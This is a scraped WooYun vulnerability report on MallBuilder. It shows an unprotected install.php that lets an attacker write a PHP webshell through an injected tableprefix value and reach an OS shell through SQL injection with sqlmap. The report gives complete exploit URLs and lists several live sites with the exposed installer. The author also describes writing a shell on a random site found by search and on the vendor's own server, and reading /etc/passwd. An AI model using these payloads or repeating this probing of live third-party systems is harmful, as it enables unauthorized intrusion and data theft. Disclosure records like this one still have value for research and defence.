{"id": 33869, "wybug_id": "wooyun-2015-0107827", "wybug_title": "MallBuilder#全版本前台无限制Getshell(两处)&amp;5.8的注入", "wybug_corp": "shop-builder.cn", "wybug_author": "浅蓝", "wybug_date": "2015-04-17 11:13", "wybug_open_date": "2015-07-19 14:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-19：\t细节向公众公开  简要描述： MallBuilder#全版本前台无限制Getshell(两处)&5.8的注入 详细说明：  /includes/smarty_config.php\n//搜索词入库if(!empty($_GET['key'])){\t$db->query(\"select id from \".SWORD.\" where keyword='$_GET[key]'\");\tif($db->fetchField('id'))\t\t$sql=\"update \".SWORD.\" set nums=nums+1 where keyword='$_GET[key]'\";\telse\t{\t\tinclude_once('lib/allchar.php');\t\t$str=addslashes(c($_GET['key']));\t\t$_GET['key']=htmlspecialchars($_GET['key']);\t\t$sql=\"insert into \".SWORD.\" (keyword,char_index,nums) values ('$_GET[key]','$str','1')\";\t}\t$db->query($sql);}\n如果$_GET[key]不为空 则执行以下sql$db->query(\"select id from \".SWORD.\" where keyword='$_GET[key]'\");$_GET[key]没有过滤话说你在后面加了转义。。为什么就不能给key也转义下呢。。\n\ninstall/install.php只给index.php做了lock文件验证 install.php为什么不验证下呢随手找了几个  连官网demo都有。 http://democn.mall-builder.com/install/install.phphttp://zswang.com.cn/install/install.phphttp://www.ycxsd.com/install/install.phphttp://kch100.com/install/install.phphttp://www.junpinjie.cn/install/install.php\n<?php /** * 安装程序 * @copyright Copyright (C) 2011 中国万网互联网解决方案事业部 * @author bruce lee  liyongqing2008@gmail.com * @access public * @package system*///设置当前系统标识define('IN_HICHINA', TRUE);//获取动作参数$action = $_GET['action'];//错误代码配置$a_error =array(    \"101\"  => array(\"msg\" => \"网络传输错误\", \"description\" => \"Get发送或接收数据失败\"),    \"102\"  => array(\"msg\" => \"参数不完整\", \"description\" => \"无参数或参数个数不对\"),    \"103\"  => array(\"msg\" => \"身份不合法\", \"description\" => \"无权限调用接口\"),    \"104\"  => array(\"msg\" => \"解压缩失败\", \"description\" => \"压缩程序和解压缩程序不匹配\"),    \"105\"  => array(\"msg\" => \"配置文件未找到\", \"description\" => \"配置文件未找到\"),    \"106\"  => array(\"msg\" => \"配置文件内容不合法\", \"description\" => \"配置文件内容不合法\"),    \"107\"  => array(\"msg\" => \"请求地址无效\", \"description\" => \"独立应用接口文件不存在或无法打开\"),    \"108\"  => array(\"msg\" => \"配置文件无法修改\", \"description\" => \"配置文件无法修改\"),    \"111\"  => array(\"msg\" => \"参数不正确\", \"description\" => \"参数长度超长或类型不匹配\"),    \"112\"  => array(\"msg\" => \"接口已失效\", \"description\" => \"接口已超时\"),    \"113\"  => array(\"msg\" => \"安装失败\", \"description\" => \"安装失败\"),    \"114\"  => array(\"msg\" => \"运行检测失败\", \"description\" => \"检测到应用无法正常执行\"),    \"121\"  => array(\"msg\" => \"安装应用失败\", \"description\" => \"安装应用失败\"),    \"122\"  => array(\"msg\" => \"安装结果检测失败\", \"description\" => \"应用安装成功但运行检测失败\"),    \"131\"  => array(\"msg\" => \"无法连接数据库或数据库服务器无响应\", \"description\" => \"无法连接数据库或数据库服务器无响应\"),    \"132\"  => array(\"msg\" => \"添加账户失败\", \"description\" => \"添加管理员账户失败\"),    \"200\"  => array(\"msg\" => \"ok\", \"description\" => \"ok\"));//输出XMLfunction outputXml($code){\tglobal $a_error;\theader(\"content-type: text/xml\");\techo '<?xml version=\"1.0\" encoding=\"utf-8\"?>\t<rsp>\t<c0de>' . $code . '<c0de>  // c0de换成code  这里被当做乌云的code标签了\t<msg>' . $a_error[$code]['msg'] . '</msg>\t</rsp>';\texit();}//安装应用//http://localhost/b2b/install/install.php?action=setup&dbhost=localhost&port=3306&dbname=hichina001_db&dbuser=root&dbpassword=root&tableprefix=b2bbuilder_&guid=6F9619FF-8B86-D011-B42D-00C04FC964FFif($action == \"setup\"){\t//检查参数是否完整\t$dbhost = $_GET['dbhost'];\t$port = $_GET['port'];\t$dbname = $_GET['dbname'];\t$dbuser = $_GET['dbuser'];\t$dbpassword = $_GET['dbpassword'];\t$tableprefix = $_GET['tableprefix'];\t$guid = $_GET['guid'];\tif(!$port)\t\t$port = 3306;\tif ($dbhost && $port && $dbname && $dbuser && $dbpassword && $tableprefix && $guid)\t{\t\t\t\tfile_put_contents(\"db.txt\", $dbhost.'|'.$port .'|'.$dbname .'|'.$dbuser .'|'.$dbpassword .'|'.$tableprefix.'|'.$guid);\t\t$link = mysql_connect($dbhost . \":\" . $port, $dbuser, $dbpassword);\t\tif($link)\t\t{\t\t\tmysql_query(\"CREATE DATABASE IF NOT EXISTS `\".$dbname.\"`;\", $link);\t\t\tmysql_query(\"SET NAMES 'utf8',character_set_client=binary,sql_mode='';\",$link);\t\t\t$link2 = mysql_select_db($dbname, $link);\t\t\tif($link2)\t\t\t{\t\t\t\t//==========================================================更新进度\t\t\t\tfile_put_contents('progress.txt', 10);\t\t\t\t//安装步骤1. 创建数据库结构\t\t\t\t$sqlfile = 'B2Bbuilder.sql';\t\t\t\t$query = '';\t\t\t\t$fp = fopen(dirname(__FILE__).'/' . $sqlfile,'r');\t\t\t\twhile($mysql=GetNextSQL())\t\t\t\t{\t\t\t\t\tmysql_query($mysql);\t\t\t\t}\t\t\t\tfclose($fp);\t\t\t\t//---------------------------------\t\t\t\t$rurl=$_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];\t\t\t\t$aurl = explode(\"/\", $rurl);\t\t\t\t$realurl='';\t\t\t\tfor($i=0;$i<count($aurl)-2;$i++)\t\t\t\t\t   $realurl=$realurl.$aurl[$i].\"/\";\t\t\t\t$realurl=\"http://\".$realurl;\t\t\t\t$realurl=substr($realurl,0,-1);\t\t\t\t\t\t\t\t\t\t\t\t$burl=explode(\".\",$realurl);\t\t\t\t$pb=array_shift($burl);\t\t\t\t$baseurl=str_replace($pb.'.','',$_POST[\"weburl\"]);\t\t\t\t$baseurl=str_replace('http://','',$_POST[\"weburl\"]);\t\t\t\t$baseurl=explode('/',$baseurl);\t\t\t\t$baseurl=$baseurl[0];\t\t\t\tif(substr($baseurl,0,3)=='loc'||substr($baseurl,0,3)=='127')\t\t\t\t\tmysql_query(\"update  \".$tableprefix.\"web_config  set `value`='' where `index`='baseurl'\");\t\t\t\telse\t\t\t\t\tmysql_query(\"update  \".$tableprefix.\"web_config  set `value`='\".$baseurl.\"' where `index`='baseurl'\");\t\t\t\tmysql_query(\"update  \".$tableprefix.\"web_config  set `value`='$realurl' where `index`='weburl'\");\t\t\t\t//写系统配置文件\t\t\t\t$rsid=mysql_query(\"select * from  \".$tableprefix.\"web_config\");\t\t\t\t$arr=array(); $configs=array();\t\t\t\twhile($row=mysql_fetch_array($rsid))\t\t\t\t{ \t\t\t\t\t$arr[] = $row; \t\t\t\t} \t\t\t\tforeach($arr as $v)\t\t\t\t{\t\t\t\t\t$index=$v['index'];\t\t\t\t\t$value=$v['value'];\t\t\t\t\t$configs[$index]=$value;\t\t\t\t}\t\t\t\t$write_config_con_array=$configs;\t\t\t\t$write_config_con_str=serialize($write_config_con_array);//将数组序列化后生成字符串\t\t\t\t$write_config_con_str='<?php $config = array_merge($config, unserialize(\\''.$write_config_con_str.'\\'));?>';//生成要写的内容\t\t\t\t$cfp=fopen(dirname(__FILE__).'/../config/web_config.php','w');\t\t\t\tfwrite($cfp,$write_config_con_str,strlen($write_config_con_str));//将内容写入文件．\t\t\t\tfclose($cfp);\t\t\t\t//======================================================更新进度\t\t\t\tfile_put_contents('progress.txt', 30);\t\t\t\t\t\t\t\t/*\t\t\t\t//安装步骤2. 导入测试数据\t\t\t\t$sqlfile = 'data.txt';\t\t\t\t$query = '';\t\t\t\t$fp = fopen(dirname(__FILE__).'/' . $sqlfile,'r');\t\t\t\twhile(!feof($fp))\t\t\t\t{\t\t\t\t\t$line = rtrim(fgets($fp, 1024));\t\t\t\t\tif(preg_match(\"#;$#\", $line))\t\t\t\t\t{\t\t\t\t\t\t$query .= $line;\t\t\t\t\t\t$query = str_replace('{tableprefix}',$tableprefix,$query);\t\t\t\t\t\t$rs = mysql_query($query,$link);\t\t\t\t\t\t$query='';\t\t\t\t\t} else if(!preg_match(\"#^(\\/\\/|--)#\", $line))\t\t\t\t\t{\t\t\t\t\t\t$query .= $line;\t\t\t\t\t}\t\t\t\t}\t\t\t\tfclose($fp);\t\t\t\t\t\t\t*/\t\t\t\t//更新进度\t\t\t\tfile_put_contents('progress.txt', 70);\t\t\t\t//=======================================================安装步骤3. 配置文件修改\t\t\t\t$contents='<?php\t\t\t\t\t$config[\\'dbhost\\'] = \\''.$dbhost.'\\';      //数据库所在IP地址\t\t\t\t\t$config[\\'dbuser\\'] = \\''.$dbuser.'\\';  //数据库用户\t\t\t\t\t$config[\\'dbpass\\'] = \\''.$dbpassword.'\\';   \t //数据库密码\t\t\t\t\t$config[\\'dbname\\'] = \\''.$dbname.'\\';     //数据库名\t\t\t\t\t$config[\\'port\\'] = \\''.$port.'\\';     //端口\t\t\t\t\t$config[\\'table_pre\\']=\\''.$tableprefix.'\\';  //数据库表前缀\t\t\t\t\t$config[\\'authkey\\']=\\''.md5(time().rand(0,100000)).'\\';  //数据库表前缀\t\t\t\t\t?>';\t\t\t\t$filename = dirname(__FILE__).\"/../config/config.inc.php\"; \t\t\t\t$cfp = fopen($filename,'w'); \t\t\t\tfwrite($cfp,$contents); \t\t\t\tfclose($cfp);\t\t\t\t//更新进度\t\t\t\tfile_put_contents('progress.txt', 100);\t\t\t\toutputXml('200');\t\t\t}\t\t\telse\t\t\t{\t\t\t\t//数据库连接失败\t\t\t\toutputXml('131');\t\t\t}    \t\tmysql_close($link);\t\t}\t\telse\t\t{\t\t\t//数据库服务器连接失败\t\t\toutputXml('131');\t\t}\t}\telse\t{\t\t//参数不正确\t\toutputXml('102');\t}}//安装结果监测//http://localhost/b2b/install/install.php?action=check&guid=6F9619FF-8B86-D011-B42D-00C04FC964FFif($action == \"check\"){\t$guid = $_GET['guid'];\tif($guid)\t{\t\t$progress = file_get_contents('progress.txt');\t\theader(\"content-type: text/xml\");\t\techo '<?xml version=\"1.0\" encoding=\"utf-8\"?>\t\t<rsp>\t\t<c0de>200</c0de>  //  !!!注意 0是o  这里的代码被乌云当做code标签了\t\t<msg>' .$progress . '</msg>\t\t</rsp>';\t}\telse\t{\t\t//参数不正确\t\toutputXml('102');\t}}//http://localhost/b2b/install/install.php?action=addadmin&adminuser=admin&adminpassword=1234//增加管理员if($action == \"addadmin\"){\t$guid = '';\t$adminuser = $_GET['adminuser'];\t$adminpassword = md5(trim($_GET['adminpassword']));\t\tif ($adminuser && $adminpassword)\t{\t\t$dbinfo = file_get_contents(\"db.txt\");\t\t$a_dbinfo = explode(\"|\", $dbinfo);\t\t$dbhost = $a_dbinfo[0];\t\t$port = $a_dbinfo[1];\t\t$dbname = $a_dbinfo[2];\t\t$dbuser = $a_dbinfo[3];\t\t$dbpassword = $a_dbinfo[4];\t\t$tableprefix = $a_dbinfo[5];\t\t$guid = $a_dbinfo[6];\t\t$link = mysql_connect($dbhost, $dbuser, $dbpassword);\t\t!$link?print(\"xxx\"):\"\";\t\tif($link)\t\t{\t\t\t$link2 = mysql_select_db($dbname, $link);\t\t\tif($link2)\t\t\t{\t\t\t\t// 创建后台管理员测试帐号\t\t\t\tmysql_query(\"insert into \".$tableprefix.\"admin (password,user,type) value ('$adminpassword','$adminuser','1')\");\t\t\t\t$result = mysql_query($sql);\t\t\t\toutputXml('200');\t\t\t}\t\t\telse\t\t\t{\t\t\t\t//数据库连接失败\t\t\t\toutputXml('131');\t\t\t}\t\t\tmysql_close($link);\t\t}\t\telse\t\t{\t\t\t//数据库服务器连接失败\t\t\toutputXml('131');\t\t}\t}\telse\t{\t\t//参数不正确\t\toutputXml('102');\t}}//==============================================function GetNextSQL(){    global $fp,$tableprefix;    $sql=\"\";    while ($line = @fgets($fp, 40960))    {\t\t$line = trim($line);\t\t//以下三句在高版本php中不需要\t\t$line = str_replace(\"\\\\\\\\\",\"\\\\\",$line);\t\t$line = str_replace(\"\\'\",\"'\",$line);\t\t$line = str_replace(\"\\\\r\\\\n\",chr(13).chr(10),$line);\t\t$line = stripcslashes($line);\t\tif (strlen($line)>1)\t\t{\t\t\tif ($line[0]==\"-\" && $line[1]==\"-\")\t\t\t{\t\t\t\tcontinue;\t\t\t}\t\t}\t\t$sql.=$line.chr(13).chr(10);\t\tif (strlen($line)>0)\t\t{\t\t\tif ($line[strlen($line)-1]==\";\")\t\t\t{\t\t\t\tbreak;\t\t\t}\t\t}    }\t$sql=str_replace(\"b2bbuilder_\",$tableprefix,$sql);    return $sql;}?>\n首先需要准备一个数据库 (自己的)然后构造个URLxxx/install/install.php?action=setup&dbhost=地址&port=端口&dbname=数据库名&dbuser=账号&dbpassword=密码&tableprefix=数据表前缀&guid=6F9619FF-8B86-D011-B42D-00C04FC964FF(不知道这是什么鬼)如果($dbhost && $port && $dbname && $dbuser && $dbpassword && $tableprefix && $guid)这个参数都有了 则\nfile_put_contents(\"db.txt\", $dbhost.'|'.$port .'|'.$dbname .'|'.$dbuser .'|'.$dbpassword .'|'.$tableprefix.'|'.$guid);\n将他们声称在install目录下的db.txt\n$link = mysql_connect($dbhost . \":\" . $port, $dbuser, $dbpassword);\n然后如果数据库能够正常连接 则在那个数据库新建一个数据库然后如果上面的命令执行完毕则 \nfile_put_contents('progress.txt', 10);\t\t\t\t//安装步骤1. 创建数据库结构\t\t\t\t$sqlfile = 'B2Bbuilder.sql';\t\t\t\t$query = '';\t\t\t\t$fp = fopen(dirname(__FILE__).'/' . $sqlfile,'r');\n由于根目录没有B2Bbuilder.sql 这个文件。。所以不能重装。。 到这里就会出错\n\n\n\n监控中 可以看到新建了个数据库再接着往下看\n$contents='<?php\t\t\t\t\t$config[\\'dbhost\\'] = \\''.$dbhost.'\\';      //数据库所在IP地址\t\t\t\t\t$config[\\'dbuser\\'] = \\''.$dbuser.'\\';  //数据库用户\t\t\t\t\t$config[\\'dbpass\\'] = \\''.$dbpassword.'\\';   \t //数据库密码\t\t\t\t\t$config[\\'dbname\\'] = \\''.$dbname.'\\';     //数据库名\t\t\t\t\t$config[\\'port\\'] = \\''.$port.'\\';     //端口\t\t\t\t\t$config[\\'table_pre\\']=\\''.$tableprefix.'\\';  //数据库表前缀\t\t\t\t\t$config[\\'authkey\\']=\\''.md5(time().rand(0,100000)).'\\';  //数据库表前缀\t\t\t\t\t?>';\t\t\t\t$filename = dirname(__FILE__).\"/../config/config.inc.php\"; \t\t\t\t$cfp = fopen($filename,'w'); \t\t\t\tfwrite($cfp,$contents); \t\t\t\tfclose($cfp);\n在同一个if判断的条件下 有这么几句代码 就是把$contents写到config/config.inc.php里由于链接地址端口数据库和账号密码都是条件中必须的。authkey又不可控  只有数据表前缀可以了。。构造URL  GET提交\nhttp://localhost/MallBuilder/install/install.php?action=setup&dbhost=localhost&port=3306&dbname=xxxxx&dbuser=root&dbpassword=root&tableprefix=xxxx';eval($_REQUEST[xsec]);//&guid=xxxx\n\n\n 一句话被写进去了\n\n再说说另外一处getshell 也是在同样的文件  install.php216行\nif($action == \"addadmin\"){\t$guid = '';\t$adminuser = $_GET['adminuser'];\t$adminpassword = md5(trim($_GET['adminpassword']));\t\tif ($adminuser && $adminpassword)\t{\t\t$dbinfo = file_get_contents(\"db.txt\");\t\t$a_dbinfo = explode(\"|\", $dbinfo);\t\t$dbhost = $a_dbinfo[0];\t\t$port = $a_dbinfo[1];\t\t$dbname = $a_dbinfo[2];\t\t$dbuser = $a_dbinfo[3];\t\t$dbpassword = $a_dbinfo[4];\t\t$tableprefix = $a_dbinfo[5];\t\t$guid = $a_dbinfo[6];\t\t$link = mysql_connect($dbhost, $dbuser, $dbpassword);\t\t!$link?print(\"xxx\"):\"\";\t\tif($link)\t\t{\t\t\t$link2 = mysql_select_db($dbname, $link);\t\t\tif($link2)\t\t\t{\t\t\t\t// 创建后台管理员测试帐号\t\t\t\tmysql_query(\"insert into \".$tableprefix.\"admin (password,user,type) value ('$adminpassword','$adminuser','1')\");\t\t\t\t$result = mysql_query($sql);\t\t\t\toutputXml('200');\t\t\t}\t\t\telse\t\t\t{\t\t\t\t//数据库连接失败\t\t\t\toutputXml('131');\t\t\t}\t\t\tmysql_close($link);\t\t}\t\telse\t\t{\t\t\t//数据库服务器连接失败\t\t\toutputXml('131');\t\t}\t}\telse\t{\t\t//参数不正确\t\toutputXml('102');\t}}\n除过if判断 他先读了db.txt 然后用|分割\n$link = mysql_connect($dbhost, $dbuser, $dbpassword);\n然后再连接数据库 如果连接成功了 则insert一个管理员\n$link2 = mysql_select_db($dbname, $link);\t\t\tif($link2)\t\t\t{\t\t\t\t// 创建后台管理员测试帐号\t\t\t\tmysql_query(\"insert into \".$tableprefix.\"admin (password,user,type) value ('$adminpassword','$adminuser','1')\");\t\t\t\t$result = mysql_query($sql);\t\t\t\toutputXml('200');\n\n\n那么问题来了，怎么getshell？他这个首先读了db.txt  而db.txt 我们可控  上面已经说过了 提交这个URL就会在db.txt生成\nhttp://localhost/MallBuilder/install/install.php?action=setup&dbhost=localhost&port=3306&dbname=xxxxx&dbuser=root&dbpassword=root&tableprefix=xxxx&guid=xxxx\nlocalhost|3306|xxxxx|root|root|xxxx|xxxx只要数据库是root权限的数据库就行。连接后 直接这条语句insert into \".$tableprefix.\"admin (password,user,type) value ('$adminpassword','$adminuser','1')adminpassword和adminuser可控   密码被md5加密 adminuser无过滤既然数据库是root权限 那就可以写shell了# 不过前提得知道绝对路径\nsqlmap.py -u \"http://localhost/MallBuilder/install/install.php?action=addadmin&adminpassword=xxxxx&adminuser=\" --os-shell\n\n\n有好多文件都报错的先百度随便找个站测试\n\n\n\n成功写入shell 并读etc/passwd接着拿官网测试\n\n\n\n写完shell我好像就被服务器给屏蔽了。。打不开   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 浅蓝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-04-20 14:36 厂商回复： 谢谢！正在处理中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-17 12:50 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  不晓得是不是审计的？给不给你礼物    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}